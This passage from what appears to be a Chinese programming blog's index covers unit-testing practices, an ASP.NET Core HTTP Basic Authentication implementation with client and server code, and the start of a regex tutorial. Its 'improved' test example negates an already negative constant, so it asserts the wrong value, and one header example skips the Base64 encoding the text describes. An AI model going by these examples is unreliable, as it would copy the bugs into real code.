<li><code>switch</code>、<code>if</code>或<code>else</code>语句；</li>
<li><code>foreach</code>、<code>for</code>或<code>while</code>循环；</li>
</ul>
<p>&emsp;&emsp;这种做法不值得推荐，因为这样的测试可读性较差，也比较脆弱。通常来说，<strong>一个单元测试应该是一系列方法的调用和断言，但是不包含控制流程语句，甚至不应该将断言语句放在<code>try-catch</code>中。</strong>  </p>
<p>（3）只测试一个关注点<br>&emsp;&emsp;如果我们的单元测试对多个对象进行了断言，那么这个测试有可能测试了多个关注点。在一个单元测试中验证多个关注点会使得事情变得复杂，却没有什么价值。你应该在分开的、独立的单元测试中验证多余的关注点，这样才能发现真正失败的地方。  </p>
<p>（4）把单元测试和集成测试分开<br>&emsp;&emsp;掐面讨论了测试的绿色安全区，我们需要的就是准备一个单独的单元测试项目，项目中仅包含那些在内存中运行，结果稳定，可重复执行的测试。  </p>
<p>（5）用代码审查确保代码覆盖率<br>&emsp;&emsp;如果覆盖率低于20%，说明我们缺少很多测试，我们不会知道下一个开发人员将怎么修改我们得代码。如果没有回失败的测试，可能就不会发现这些错误。</p>
<h3 id="编写可维护性的测试"><a href="#编写可维护性的测试" class="headerlink" title="编写可维护性的测试"></a>编写可维护性的测试</h3><p>可维护性是大多数开发者在编写单元测试时面对的核心问题之一。为此我们需要：<br>（1）只测试公共契约<br>（2）删除重复测试（去除重复代码）<br>（3）实施测试隔离  </p>
<p>测试隔离的基本概念是：<strong>一个测试应该总是在它自己的小世界中运行，与其他类似或不同的工作的测试隔离，甚至不知道其他测试的存在。</strong></p>
<h3 id="编写可读性的测试"><a href="#编写可读性的测试" class="headerlink" title="编写可读性的测试"></a>编写可读性的测试</h3><p>不可读的测试几乎没有任何意义，它是我们向项目的下一代开发者讲述的故事，帮助开发者理解一个应用程序的组成及其开端。<br>（1）单元测试命名<br>&emsp;&emsp;这个前面我们讨论过，应该包括三部分：被测试方法名_测试场景_预期行为，如果开发人员都是用这种规范，其他的开发人员就能很容易进入项目，理解测试。  </p>
<p>（2）变量命名<br>&emsp;&emsp;通过合理命名变量，你可以确保阅读测试的人可以尽快地理解你要验证什么（相对于理解产品代码中你想要实现什么）。请看下面的一个例子：</p>
<figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">[<span class="meta">Test</span>]</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">BadlyNameTest</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    LogAnalyzer log = <span class="keyword">new</span> LogAnalyzer();</span><br><span class="line">    <span class="keyword">int</span> result = log.GetLineCount(<span class="string">"abc.txt"</span>);</span><br><span class="line"></span><br><span class="line">    Assert.AreEqual(<span class="number">-100</span>, result);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">[<span class="meta">Test</span>]</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">GoodNameTest</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    LogAnalyzer log = <span class="keyword">new</span> LogAnalyzer();</span><br><span class="line">    <span class="keyword">int</span> result = log.GetLineCount(<span class="string">"abc.txt"</span>);</span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">int</span> COULD_NOT_READ_FILE = <span class="number">-100</span>;</span><br><span class="line"></span><br><span class="line">    Assert.AreEqual(-COULD_NOT_READ_FILE, result);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;经过改进后，我们会很容易理解这个返回值的意义。  </p>
<p>（3）有意义的断言<br>&emsp;&emsp;只有当测试确实需要，并且找不到别的办法使测试更清晰时，你才应该编写定制的断言信息。编写好的断言信息就像编写好的异常信息，一不小心就会犯错，使读者产生误解，浪费他们的时间。  </p>
<p>（4）断言和操作分离<br>&emsp;&emsp;为了可读性，请不要把断言和方法调用写在同一行。</p>
<figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 断言和操作写在了同一行</span></span><br><span class="line">Assert.AreEqual(-COULD_NOT_READ_FILE, log.GetLineCount(<span class="string">"abc.txt"</span>));</span><br></pre></td></tr></table></figure>

<h2 id="小结-2"><a href="#小结-2" class="headerlink" title="小结"></a>小结</h2><p>这一篇我们学习了：</p>
<ul>
<li>尽量将测试自动化，尽可能多次地运行测试，尽可能持续地进行产品交付；</li>
<li>把集成测试和单元测试分开，为整个团队构建一个绿色安全区，该区域中所有的测试都必须通过；</li>
<li>按照项目和类型组织测试，把测试分别放在不同的目录、文件夹或者命名空间中；</li>
<li>使用测试类层次，对一个层次中相关的几个类进行同一组测试，或者对共享一个通用接口或者基类的类型进行同一组测试；</li>
<li>优秀单元测试具有三大支柱：可读性、可维护性与可靠性，它们相辅相成。</li>
<li>如果人们能读懂你的测试，就能理解和维护测试，如果测试能够通过，它们也会信任测试。一旦实现这个目标，你就能知道系统是否正常工作，具有了处理变更和在需要时修改代码的能力；</li>
</ul>
<p>本系列文章的示例代码：<a href="http://pan.baidu.com/s/1dF0vuwx" target="_blank" rel="noopener">点此下载</a></p>
<h2 id="参考资料-2"><a href="#参考资料-2" class="headerlink" title="参考资料"></a>参考资料</h2><p>（1）Roy Osherove 著，金迎 译，《单元测试的艺术（第2版）》</p>
]]></content>
      
        <categories>
            
            <category> 编程 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> CSharp </tag>
            
            <tag> dotNET </tag>
            
            <tag> UnitTest </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[ASP.NET Core 实现基本认证]]></title>
      <url>/2020/01/02/AspNetCoreBasicAuthentication/</url>
      <content type="html"><![CDATA[<blockquote>
<p><a href="https://www.cnblogs.com/JulianHuang/p/10345365.html" target="_blank" rel="noopener">https://www.cnblogs.com/JulianHuang/p/10345365.html</a></p>
</blockquote>
<a id="more"></a>

<h1 id="HTTP-基本认证"><a href="#HTTP-基本认证" class="headerlink" title="HTTP 基本认证"></a>HTTP 基本认证</h1><p>&emsp;&emsp;在 HTTP 中，<a href="https://en.wikipedia.org/wiki/Basic_access_authentication" target="_blank" rel="noopener">HTTP 基本认证</a>（Basic Authentication）是一种允许网页浏览器或其他客户端程序以<code>用户名:口令</code>请求资源的身份验证方式，不要求 Cookie、Session Identifier、Login Page 等标记或载体。  </p>
<ul>
<li>所有浏览器都支持 HTTP 基本认证方式；</li>
<li>基本认证原理<strong>不保证传输凭证的安全性</strong>，仅被<code>Base64</code>编码，并没有 Encrypted 或者 Hashed，一般部署在<strong>客户端和服务端互信</strong>的网络，在<strong>公网</strong>中应用 BA 认证通常与 <strong>HTTPS</strong> 结合。</li>
</ul>
<h1 id="BA-标准协议"><a href="#BA-标准协议" class="headerlink" title="BA 标准协议"></a>BA 标准协议</h1><p>BA 认证协议的实施主要依靠约定的 <strong>请求头 / 响应头</strong>， 典型的浏览器和服务器的 BA 认证流程：</p>
<ol>
<li><p>浏览器请求应用了 BA 协议的网站，服务端响应一个 401 认证失败响应码，并写入<code>WWW-Authenticate</code>响应头，指示服务端支持 BA 协议。<br>或客户端在第一次请求时发送正确<code>Authorization</code>标头，从而避免被质询。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1 401 Unauthorized</span><br><span class="line"></span><br><span class="line">WWW-Authenticate: Basic realm=<span class="string">"our site"</span></span><br><span class="line"><span class="comment"># WWW-Authenticate 响应头包含一个 realm 域属性，指明 HTTP 基本认证的是这个资源集</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>客户端以 <code>Base64</code> 编码<code>用户名:口令</code>，作为<code>Authorization</code>标头值重新发送请求。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Authorization: Basic userid:password</span><br></pre></td></tr></table></figure>

</li>
</ol>
<figure class="image-box">
                <img src="587720-20191106153345436-984330407.png" alt title class>
                <p></p>
            </figure>

<p>所以在 HTTP 基本认证中认证范围与<code>realm</code>有关（具体由服务端定义）。</p>
<blockquote>
<p>一般浏览器客户端对于<code>www-Authenticate</code>质询结果，会弹出口令输入窗。</p>
</blockquote>
<h1 id="BA-编程实践"><a href="#BA-编程实践" class="headerlink" title="BA 编程实践"></a>BA 编程实践</h1><blockquote>
<p>&emsp;&emsp;ASP.NET Core 网站利用 FileServerMiddleware 将路径映射到某文件资源， 现对该文件资源访问路径应用 Http BA 协议。  </p>
</blockquote>
<p>ASP.NET Core 服务端实现 BA 认证：</p>
<ol>
<li>实现服务端基本认证的认证过程、质询逻辑；</li>
<li>实现基本身份认证交互中间件<code>BasicAuthenticationMiddleware</code>，要求对<code>HttpContext</code>使用<code>BA.Scheme</code>；</li>
<li>ASP.NET Core 添加认证计划，为文件资源访问路径启用 BA 中间件，注意使用<code>UseWhen</code>插入中间件（适用于 ASP.NET Core 2.X）。</li>
</ol>
<figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">using</span> System;</span><br><span class="line"><span class="keyword">using</span> System.Net.Http.Headers;</span><br><span class="line"><span class="keyword">using</span> System.Security.Claims;</span><br><span class="line"><span class="keyword">using</span> System.Text;</span><br><span class="line"><span class="keyword">using</span> System.Text.Encodings.Web;</span><br><span class="line"><span class="keyword">using</span> System.Threading.Tasks;</span><br><span class="line"><span class="keyword">using</span> Microsoft.AspNetCore.Authentication;</span><br><span class="line"><span class="keyword">using</span> Microsoft.Extensions.Logging;</span><br><span class="line"><span class="keyword">using</span> Microsoft.Extensions.Options;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">EqidManager.Services</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">class</span> <span class="title">BasicAuthenticationScheme</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">const</span> <span class="keyword">string</span> DefaultScheme = <span class="string">"Basic"</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">class</span> <span class="title">BasicAuthenticationOption</span>:<span class="title">AuthenticationSchemeOptions</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">string</span> Realm &#123; <span class="keyword">get</span>; <span class="keyword">set</span>; &#125;</span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">string</span> UserName &#123; <span class="keyword">get</span>; <span class="keyword">set</span>; &#125;</span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">string</span> UserPwd &#123; <span class="keyword">get</span>; <span class="keyword">set</span>; &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public class BasicAuthenticationHandler : AuthenticationHandler&lt;BasicAuthenticationOption&gt;</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="keyword">readonly</span> BasicAuthenticationOption authOptions;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="title">BasicAuthenticationHandler</span>(<span class="params"></span></span></span><br><span class="line"><span class="function"><span class="params">            IOptionsMonitor&lt;BasicAuthenticationOption&gt; options,</span></span></span><br><span class="line"><span class="function"><span class="params">            ILoggerFactory logger,</span></span></span><br><span class="line"><span class="function"><span class="params">            UrlEncoder encoder,</span></span></span><br><span class="line"><span class="function"><span class="params">            ISystemClock clock</span>)</span></span><br><span class="line"><span class="function">            : <span class="title">base</span>(<span class="params">options, logger, encoder, clock</span>)</span></span><br><span class="line"><span class="function"></span>        &#123;</span><br><span class="line">            authOptions = options.CurrentValue;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment"><span class="doctag">///</span> <span class="doctag">&lt;summary&gt;</span></span></span><br><span class="line">        <span class="comment"><span class="doctag">///</span> 认证</span></span><br><span class="line">        <span class="comment"><span class="doctag">///</span> <span class="doctag">&lt;/summary&gt;</span></span></span><br><span class="line">        <span class="comment"><span class="doctag">///</span> <span class="doctag">&lt;returns&gt;</span><span class="doctag">&lt;/returns&gt;</span></span></span><br><span class="line">        <span class="function"><span class="keyword">protected</span> <span class="keyword">override</span> <span class="keyword">async</span> Task&lt;AuthenticateResult&gt; <span class="title">HandleAuthenticateAsync</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>        &#123;</span><br><span class="line">            <span class="keyword">if</span> (!Request.Headers.ContainsKey(<span class="string">"Authorization"</span>))</span><br><span class="line">                <span class="keyword">return</span> AuthenticateResult.Fail(<span class="string">"Missing Authorization Header"</span>);</span><br><span class="line">            <span class="keyword">string</span> username, password;</span><br><span class="line">            <span class="keyword">try</span></span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">var</span> authHeader = AuthenticationHeaderValue.Parse(Request.Headers[<span class="string">"Authorization"</span>]);</span><br><span class="line">                <span class="keyword">var</span> credentialBytes = Convert.FromBase64String(authHeader.Parameter);</span><br><span class="line">                <span class="keyword">var</span> credentials = Encoding.UTF8.GetString(credentialBytes).Split(<span class="string">':'</span>);</span><br><span class="line">                username = credentials[<span class="number">0</span>];</span><br><span class="line">                password = credentials[<span class="number">1</span>];</span><br><span class="line">                <span class="keyword">var</span> isValidUser= IsAuthorized(username,password);</span><br><span class="line">                <span class="keyword">if</span>(isValidUser== <span class="literal">false</span>)</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="keyword">return</span> AuthenticateResult.Fail(<span class="string">"Invalid username or password"</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">catch</span></span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">return</span> AuthenticateResult.Fail(<span class="string">"Invalid Authorization Header"</span>);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">var</span> claims = <span class="keyword">new</span>[] &#123;</span><br><span class="line">                <span class="keyword">new</span> Claim(ClaimTypes.NameIdentifier, username),</span><br><span class="line">                <span class="keyword">new</span> Claim(ClaimTypes.Name, username),</span><br><span class="line">            &#125;;</span><br><span class="line">            <span class="keyword">var</span> identity = <span class="keyword">new</span> ClaimsIdentity(claims, Scheme.Name);</span><br><span class="line">            <span class="keyword">var</span> principal = <span class="keyword">new</span> ClaimsPrincipal(identity);</span><br><span class="line">            <span class="keyword">var</span> ticket = <span class="keyword">new</span> AuthenticationTicket(principal, Scheme.Name);</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">await</span> Task.FromResult(AuthenticateResult.Success(ticket));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment"><span class="doctag">///</span> <span class="doctag">&lt;summary&gt;</span></span></span><br><span class="line">        <span class="comment"><span class="doctag">///</span> 质询</span></span><br><span class="line">        <span class="comment"><span class="doctag">///</span> <span class="doctag">&lt;/summary&gt;</span></span></span><br><span class="line">        <span class="comment"><span class="doctag">///</span> <span class="doctag">&lt;param name="properties"&gt;</span><span class="doctag">&lt;/param&gt;</span></span></span><br><span class="line">        <span class="comment"><span class="doctag">///</span> <span class="doctag">&lt;returns&gt;</span><span class="doctag">&lt;/returns&gt;</span></span></span><br><span class="line">        <span class="function"><span class="keyword">protected</span> <span class="keyword">override</span> <span class="keyword">async</span> Task <span class="title">HandleChallengeAsync</span>(<span class="params">AuthenticationProperties properties</span>)</span></span><br><span class="line"><span class="function"></span>        &#123;</span><br><span class="line">            Response.Headers[<span class="string">"WWW-Authenticate"</span>] = <span class="string">$"Basic realm=\"<span class="subst">&#123;Options.Realm&#125;</span>\""</span>;</span><br><span class="line">            <span class="keyword">await</span> <span class="keyword">base</span>.HandleChallengeAsync(properties);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment"><span class="doctag">///</span> <span class="doctag">&lt;summary&gt;</span></span></span><br><span class="line">        <span class="comment"><span class="doctag">///</span> 认证失败</span></span><br><span class="line">        <span class="comment"><span class="doctag">///</span> <span class="doctag">&lt;/summary&gt;</span></span></span><br><span class="line">        <span class="comment"><span class="doctag">///</span> <span class="doctag">&lt;param name="properties"&gt;</span><span class="doctag">&lt;/param&gt;</span></span></span><br><span class="line">        <span class="comment"><span class="doctag">///</span> <span class="doctag">&lt;returns&gt;</span><span class="doctag">&lt;/returns&gt;</span></span></span><br><span class="line">        <span class="function"><span class="keyword">protected</span> <span class="keyword">override</span> <span class="keyword">async</span> Task <span class="title">HandleForbiddenAsync</span>(<span class="params">AuthenticationProperties properties</span>)</span></span><br><span class="line"><span class="function"></span>        &#123;</span><br><span class="line">            <span class="keyword">await</span> <span class="keyword">base</span>.HandleForbiddenAsync(properties); </span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">private</span> <span class="keyword">bool</span> <span class="title">IsAuthorized</span>(<span class="params"><span class="keyword">string</span> username, <span class="keyword">string</span> password</span>)</span></span><br><span class="line"><span class="function"></span>        &#123;</span><br><span class="line">            <span class="keyword">return</span> username.Equals(authOptions.UserName, StringComparison.InvariantCultureIgnoreCase)</span><br><span class="line">                   &amp;&amp; password.Equals(authOptions.UserPwd);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// HTTP 基本认证 Middleware</span></span><br><span class="line"> <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">class</span> <span class="title">BasicAuthentication</span></span><br><span class="line"> &#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">UseBasicAuthentication</span>(<span class="params"><span class="keyword">this</span> IApplicationBuilder app</span>)</span></span><br><span class="line"><span class="function"></span>    &#123;</span><br><span class="line">        app.UseMiddleware&lt;BasicAuthenticationMiddleware&gt;();</span><br><span class="line">    &#125;</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title">BasicAuthenticationMiddleware</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">readonly</span> RequestDelegate _next;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">readonly</span> ILogger _logger;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">BasicAuthenticationMiddleware</span>(<span class="params">RequestDelegate next, ILoggerFactory LoggerFactory</span>)</span></span><br><span class="line"><span class="function"></span>    &#123;</span><br><span class="line">        _next = next;</span><br><span class="line">        _logger = LoggerFactory.CreateLogger&lt;BasicAuthenticationMiddleware&gt;();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">async</span> Task <span class="title">Invoke</span>(<span class="params">HttpContext httpContext, IAuthenticationService authenticationService</span>)</span></span><br><span class="line"><span class="function"></span>    &#123;</span><br><span class="line">        <span class="keyword">var</span> authenticated = <span class="keyword">await</span> authenticationService.AuthenticateAsync(httpContext, BasicAuthenticationScheme.DefaultScheme);</span><br><span class="line">        _logger.LogInformation(<span class="string">"Access Status："</span> + authenticated.Succeeded);</span><br><span class="line">        <span class="keyword">if</span> (!authenticated.Succeeded)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">await</span> authenticationService.ChallengeAsync(httpContext, BasicAuthenticationScheme.DefaultScheme, <span class="keyword">new</span> AuthenticationProperties &#123; &#125;);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">await</span> _next(httpContext);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>Startup.cs</code>文件添加并启用 HTTP 基本认证。</p>
<figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">services.AddAuthentication(BasicAuthenticationScheme.DefaultScheme)</span><br><span class="line">        .AddScheme&lt;BasicAuthenticationOption, BasicAuthenticationHandler&gt;(BasicAuthenticationScheme.DefaultScheme, <span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// _protectedResourceOption.Path 是需要设置 BA 认证的路径 </span></span><br><span class="line">app.UseWhen(</span><br><span class="line">    predicate:x =&gt; x.Request.Path.StartsWithSegments(<span class="keyword">new</span> PathString(_protectedResourceOption.Path)),</span><br><span class="line">    configuration:appBuilder =&gt; &#123; appBuilder.UseBasicAuthentication(); &#125;</span><br><span class="line">);</span><br></pre></td></tr></table></figure>

<p>以上 BA 认证的服务端已经完成，现在可以在浏览器测试：</p>
<figure class="image-box">
                <img src="587720-20191106165026365-1039334527.gif" alt title class>
                <p></p>
            </figure>

<h2 id="编程实现-BA-客户端"><a href="#编程实现-BA-客户端" class="headerlink" title="编程实现 BA 客户端"></a>编程实现 BA 客户端</h2><figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"><span class="doctag">///</span> <span class="doctag">&lt;summary&gt;</span></span></span><br><span class="line"><span class="comment"><span class="doctag">///</span> BA 认证请求 Handler</span></span><br><span class="line"><span class="comment"><span class="doctag">///</span> <span class="doctag">&lt;/summary&gt;</span></span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title">BasicAuthenticationClientHandler</span> : <span class="title">HttpClientHandler</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">string</span> BAHeaderNames = <span class="string">"authorization"</span>;</span><br><span class="line">    <span class="keyword">private</span> RemoteBasicAuth _remoteAccount;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">BasicAuthenticationClientHandler</span>(<span class="params">RemoteBasicAuth remoteAccount</span>)</span></span><br><span class="line"><span class="function"></span>    &#123;</span><br><span class="line">        _remoteAccount = remoteAccount;</span><br><span class="line">        AllowAutoRedirect = <span class="literal">false</span>;</span><br><span class="line">        UseCookies = <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">override</span> Task&lt;HttpResponseMessage&gt; <span class="title">SendAsync</span>(<span class="params">HttpRequestMessage request, CancellationToken cancellationToken</span>)</span></span><br><span class="line"><span class="function"></span>    &#123;</span><br><span class="line">        <span class="keyword">var</span> authorization = <span class="string">$"<span class="subst">&#123;_remoteAccount.UserName&#125;</span>:<span class="subst">&#123;_remoteAccount.Password&#125;</span>"</span>;</span><br><span class="line">        <span class="keyword">var</span> authorizationBase64 = <span class="string">"Basic "</span> + Convert.ToBase64String(<span class="keyword">new</span> ASCIIEncoding().GetBytes(authorization));</span><br><span class="line">        request.Headers.Remove(BAHeaderNames);</span><br><span class="line">        request.Headers.Add(BAHeaderNames, authorizationBase64);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">base</span>.SendAsync(request, cancellationToken);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 生成 Basic Authentication 请求</span></span><br><span class="line">services.AddHttpClient(<span class="string">"eqid-ba-request"</span>, x =&gt;</span><br><span class="line">            x.BaseAddress = <span class="keyword">new</span> Uri(_proxyOption.Scheme + <span class="string">"://"</span> + _proxyOption.Host + <span class="string">":"</span> + _proxyOption.Port))</span><br><span class="line">        .ConfigurePrimaryHttpMessageHandler(y =&gt; <span class="keyword">new</span> BasicAuthenticationClientHandler(_remoteAccount)&#123;&#125;)</span><br><span class="line">        .SetHandlerLifetime(TimeSpan.FromMinutes(<span class="number">2</span>));</span><br></pre></td></tr></table></figure>]]></content>
      
        <categories>
            
            <category> 编程 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> CSharp </tag>
            
            <tag> ASPNETCore </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[正则表达式教程]]></title>
      <url>/2020/01/01/LearningRegex/</url>
      <content type="html"><![CDATA[<blockquote>
<p><a href="https://github.com/dunwu/blog/blob/master/source/_posts/tools/regex.md" target="_blank" rel="noopener">https://github.com/dunwu/blog/blob/master/source/_posts/tools/regex.md</a></p>
</blockquote>
<a id="more"></a>

<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>为了理解下面章节的内容，你需要先了解一些基本概念。</p>
<ul>
<li><strong>正则表达式</strong> - 正则表达式是对字符串操作的一种逻辑公式，就是用事先定义好的一些特定字符、及这些特定字符的组合，组成一个“规则字符串”，这个“规则字符串”用来表达对字符串的一种过滤逻辑。</li>
<li><strong>元字符</strong> - 元字符(metacharacters)就是正则表达式中具有特殊意义的专用字符。</li>
<li><strong>普通字符</strong> - 普通字符包括没有显式指定为元字符的所有可打印和不可打印字符。这包括所有大写和小写字母、所有数字、所有标点符号和一些其他符号。</li>
</ul>
<h2 id="基本元字符"><a href="#基本元字符" class="headerlink" title="基本元字符"></a>基本元字符</h2><p>正则表达式的元字符难以记忆，很大程度上是因为有很多为了简化表达而出现的等价字符。</p>
<p>而实际上最基本的元字符，并没有那么多。对于大部分的场景，基本元字符都可以搞定。</p>
<p>让我们从一个个实例出发，由浅入深的去体会正则的奥妙。</p>
<h3 id="多选"><a href="#多选" class="headerlink" title="多选 - |"></a>多选 - |</h3><p><strong>例 匹配一个确定的字符串</strong></p>
